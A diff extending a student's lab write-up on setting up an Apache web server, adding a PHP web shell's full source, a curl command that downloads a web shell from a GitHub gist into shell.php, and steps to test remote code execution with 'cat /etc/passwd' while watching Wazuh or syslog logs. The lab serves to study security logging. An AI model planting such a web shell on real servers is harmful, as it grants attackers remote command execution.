@@ -88,5 +88,47 @@ Now we need to restart httpd again after saving the file we should be able to cu
 
 `curl http://172.16.50.3`
 
-and it should 
+and it should show your homepage message like **Welcome to web01**
+
+Here is an HTML source code that Devin used for testing security logs
+
+```
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
+```
+
+In order for this to be utilized in teh webserver, we can curl on the raw content from GitHub and have it name the .php file to "shell.php" with the command below
+
+```curl https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php -o shell.php
+```
+
+Now we should be able to test remote code execution by typing
+
+`http://[WEBSERVER_IP]/shell.php`
+
+in the browser bar
+
+If we enter **cat /etc/passwd**  we will get an error of 403 Forbidden
+
+We can also use Wazuh and/or syslog on web01 by typing
+
+`cat /etc/passwd` in to the input box to see the 403 error
+
+# Problems
+
+I had minor issues curling the raw content from github for the php file in the wrong folder so i just had to remove it and put it in the correct location of the html directory. Other than that I did not have too many issues with this lab.
 
